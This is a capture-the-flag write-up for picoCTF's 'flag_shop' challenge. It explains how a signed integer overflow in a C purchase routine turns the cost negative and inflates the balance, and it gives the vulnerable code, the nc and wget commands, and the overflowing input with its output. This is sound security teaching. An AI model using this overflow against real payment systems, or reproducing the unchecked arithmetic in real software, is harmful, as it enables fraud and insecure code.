# flag_shop

## Table of Matters

[Solution](#Solution)

[Resources](#Resources)

## Details

- **Points:** 300

- **Source:** picoCTF

- **Author:** DANNY

## Description

There's a flag shop selling stuff, can you buy a flag? Source. Connect with `nc jupiter.challenges.picoctf.org 4906`.

### Hint 1

Two's compliment can do some weird things when numbers get really big!

## Solution

- Fetch the file required for the challenge with the `wget` command like so:

```
$ wget https://jupiter.challenges.picoctf.org/static/64e724ad327f83ad833d9c6baa072b1f/store.c
```

- Establish a connection with `nc`:

```
nc jupiter.challenges.picoctf.org 4906
```

- After probing the app a bit, it turns out to be simple. It's a C program with which our interaction consists of 3 different kinds of operations: Checking balance, buying flags and exiting. From the source code we can see that we can get the flag if we succeed to buy a `1337 flag`, but we don't have enough money. The program initially only gives us 1100 dollars and the flag we want costs 10000 dollars. We immediately guess that we need to find a way to change our current balance.

- The only time we can interact with our balance is when we're buying normal flags which each cost 900 dollars, as you can see from this block of instructions:

```c
int number_flags = 0;
fflush(stdin);
scanf("%d", &number_flags);
if(number_flags > 0){
    int total_cost = 0;
    total_cost = 900*number_flags;
    printf("\nThe final cost is: %d\n", total_cost);
    if(total_cost <= account_balance){
        account_balance = account_balance - total_cost;
```

- As you can see the only way to increase our balance is if `total_cost` were to be a negative integer, thus the instruction `account_balance = account_balance - total_cost;` would serve to increase the balance.

- Luckily for us, it seems like `total_cost` is defined by the program as a signed integer. Meaning it can take a negative value. The question is, how can we exploit that to our advantage?

- Every signed integers have a `INT_MIN` and `INT_MAX` value that if they are surpassed, it will cause an overflow. If we enter a large number for `number_flags`, then `900*number_flags` aka `total_cost` would overflow and turn into a large negative number, thus bypassing the condition `if(total_cost <= account_balance)` and increasing our `account_balance` in the instruction `account_balance = account_balance - total_cost`:

```
Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
4444444

The final cost is: -294967696

Your current balance after transaction: 294968796
```

- With such a large balance, we can buy a `1337 flag` and get our flag !

## Resources

- [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow)
- [Integer Overflow Prevention in C](https://splone.com/blog/2015/3/11/integer-overflow-prevention-in-c/)
